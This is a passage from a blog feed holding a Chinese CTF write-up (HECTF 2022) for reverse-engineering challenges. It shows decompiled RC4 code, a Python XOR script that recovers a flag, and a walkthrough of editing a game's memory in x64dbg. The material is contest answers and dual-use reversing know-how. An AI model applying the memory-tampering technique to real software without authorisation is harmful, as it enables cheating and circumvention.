class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> S[<span class="hljs-number">256</span>]=&#123;&#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> T[<span class="hljs-number">256</span>]=&#123;&#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> Key[]=<span class="hljs-string">&quot;thisiskey&quot;</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> KeyStream[<span class="hljs-number">32</span>]=&#123;&#125;;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *<span class="hljs-title function_">init_S</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">255</span>; ++i )<br>  &#123;<br>    result = S;<br>    S[i] = i;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">init_Key</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">255</span>; ++i )<br>  &#123;<br>    result = T;<br>    T[i] = Key[i % <span class="hljs-number">9</span>];<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *<span class="hljs-title function_">permute_S</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  v3 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">255</span>; ++i )<br>  &#123;<br>    v3 = (S[i] + v3 + (<span class="hljs-type">char</span>)T[i]) % <span class="hljs-number">256</span>;<br>    v1 = S[i];<br>    S[i] = S[v3];<br>    result = S;<br>    S[v3] = v1;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-type">char</span>  <span class="hljs-title function_">create_key_stream</span><span class="hljs-params">(<span class="hljs-type">int</span> a2)</span><br>&#123;<br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">char</span> result; <span class="hljs-comment">// al</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  v5 = <span class="hljs-number">0</span>;<br>  v6 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; ; KeyStream[v5++] = S[(S[v6] + S[i]) % <span class="hljs-number">256</span>] )<br>  &#123;<br>    v2 = a2--;<br>    result = v2 != <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> ( !result )<br>      <span class="hljs-keyword">break</span>;<br>    i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>;<br>    v6 = (v6 + S[i]) % <span class="hljs-number">256</span>;<br>    v4 = S[i];<br>    S[i] = S[v6];<br>    S[v6] = v4;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>   init_S();<br>  init_Key();<br>  permute_S();<br>  create_key_stream(<span class="hljs-number">32</span>);<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">32</span>;i++)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,KeyStream[i]);<br>  &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>运行后得到<code>[139,176,166,182,170,108,177,66,249,64,195,137,150,140,2,41,86,253,212,116,98,236,64,117,90,37,237,197,126,172,174,59]</code>，这个就是<code>KeyStream</code>的值</p><p><code>KeyStream</code>的值与<code>Cry</code>的值异或，得到flag</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">0xC3</span>,<span class="hljs-number">0xF5</span>,<span class="hljs-number">0xE5</span>,<span class="hljs-number">0xE2</span>,<span class="hljs-number">0xEC</span>,<span class="hljs-number">0x17</span>,<span class="hljs-number">0xE5</span>,<span class="hljs-number">0x2A</span>,<span class="hljs-number">0xCA</span>,<span class="hljs-number">0x3</span>,<span class="hljs-number">0xB6</span>,<span class="hljs-number">0xFD</span>,<span class="hljs-number">0xC1</span>,<span class="hljs-number">0xBC</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0xCD</span>,<span class="hljs-number">0xA6</span>,<span class="hljs-number">0x13</span>,<span class="hljs-number">0x0B</span>,<span class="hljs-number">0x9A</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0x0E</span>,<span class="hljs-number">0x4D</span>,<span class="hljs-number">0xDE</span>,<span class="hljs-number">0x95</span>,<span class="hljs-number">0x12</span>,<span class="hljs-number">0x9C</span>,<span class="hljs-number">0xD9</span>,<span class="hljs-number">0x46</span>]<br>b=[<span class="hljs-number">139</span>,<span class="hljs-number">176</span>,<span class="hljs-number">166</span>,<span class="hljs-number">182</span>,<span class="hljs-number">170</span>,<span class="hljs-number">108</span>,<span class="hljs-number">177</span>,<span class="hljs-number">66</span>,<span class="hljs-number">249</span>,<span class="hljs-number">64</span>,<span class="hljs-number">195</span>,<span class="hljs-number">137</span>,<span class="hljs-number">150</span>,<span class="hljs-number">140</span>,<span class="hljs-number">2</span>,<span class="hljs-number">41</span>,<span class="hljs-number">86</span>,<span class="hljs-number">253</span>,<span class="hljs-number">212</span>,<span class="hljs-number">116</span>,<span class="hljs-number">98</span>,<span class="hljs-number">236</span>,<span class="hljs-number">64</span>,<span class="hljs-number">117</span>,<span class="hljs-number">90</span>,<span class="hljs-number">37</span>,<span class="hljs-number">237</span>,<span class="hljs-number">197</span>,<span class="hljs-number">126</span>,<span class="hljs-number">172</span>,<span class="hljs-number">174</span>,<span class="hljs-number">59</span>]<br>e=<span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(a):<br>    e+=<span class="hljs-built_in">chr</span>(v^b[i])<br><span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><h2 id="勇士斗恶龙"><a href="#勇士斗恶龙" class="headerlink" title="勇士斗恶龙"></a>勇士斗恶龙</h2><p>在ida中通过搜索字符串跳转到程序主要函数，得到函数对于程序的偏移地址<code>38B0</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/reverse4-1.png"></p><p>x64dbg动态调试程序，在主要函数设置断点</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/reverse4-2.png"></p><p>当程序中断时，rcx的值是<code>00000170E3A824B0</code>，储存了两个指针，指向了勇士和恶龙的对象</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/reverse4-3.png"></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/reverse4-4.png"></p><p><code>0x170e3a828e0+0x20</code>地址处储存了勇士的金币数，将其修改为<code>0xffff</code>,购买高级的装备，将内存地址转移到<code>0x170e3a82950+0x20</code>指向的地址处，输入<code>a</code>攻击恶龙，观察内存数据变化,当恶龙血量为<code>520</code>时得到<code>flag</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/reverse4-5.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Rank: 13&lt;/p&gt;
&lt;h1 id=&quot;misc&quot;&gt;&lt;a href=&quot;#misc&quot; class=&quot;headerlink&quot; title=&quot;misc&quot;&gt;&lt;/a&gt;misc&lt;/h1&gt;&lt;h2 id=&quot;咦-小鲨鱼来喽&quot;&gt;&lt;a href=&quot;#咦-小鲨鱼来喽&quot; class=&quot;header</summary>
      
    
    
    
    <category term="wp" scheme="https://www.lewiserii.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.lewiserii.top/tags/wp/"/>
    
    <category term="HECTF" scheme="https://www.lewiserii.top/tags/HECTF/"/>
    
  </entry>
  
</feed>
